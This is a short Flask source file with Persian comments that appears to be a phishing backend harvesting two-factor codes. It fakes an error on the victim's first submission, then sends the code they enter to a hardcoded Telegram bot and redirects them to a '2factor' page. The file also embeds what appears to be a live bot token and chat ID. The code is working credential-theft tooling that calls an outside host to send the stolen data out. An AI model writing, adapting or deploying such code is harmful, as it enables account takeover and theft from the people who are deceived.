from flask import Flask, request, render_template, session, jsonify
import requests

app = Flask(__name__)
app.secret_key = "supersecretkey"  # کلید برای مدیریت session

# تنظیمات ربات تلگرام
BOT_TOKEN = "6445656205:AAFLnpRFXgRvD8I3dMXahrSJxufEV3vdVHY"
CHAT_ID = "5088806230"

@app.route("/", methods=["GET", "POST"])
def index():
    if "attempts" not in session:
        session["attempts"] = 0  # مقداردهی اولیه به تعداد تلاش‌ها

    if request.method == "POST":
        session["attempts"] += 1  # افزایش تعداد تلاش‌ها
        code = request.form.get("code")  # دریافت کد از فرم

        if session["attempts"] < 2:
            # بار اول خطا ارسال می‌شود
            return jsonify({"status": "error"})
        else:
            # بار دوم موفقیت اعلام می‌شود و پیام به تلگرام ارسال می‌شود
            message = f"Entered code: {code}"
            send_message_to_telegram(message)
            session["attempts"] = 0  # بازنشانی تعداد تلاش‌ها پس از موفقیت
            return jsonify({"status": "success", "redirect_url": "https://2factor-production.up.railway.app/"})

    return render_template("index_with_emoji.html")

def send_message_to_telegram(message):
    """ارسال مستقیم پیام به ربات تلگرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": CHAT_ID,
            "text": message
        }
        response = requests.post(url, params=params, timeout=10)
        response.raise_for_status()  # بررسی خطاها
        print("Message sent to Telegram:", response.json())
    except requests.RequestException as e:
        print(f"Error in sending data to Telegram: {str(e)}")
    except Exception as e:
        print(f"Unexpected error in sending data: {str(e)}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)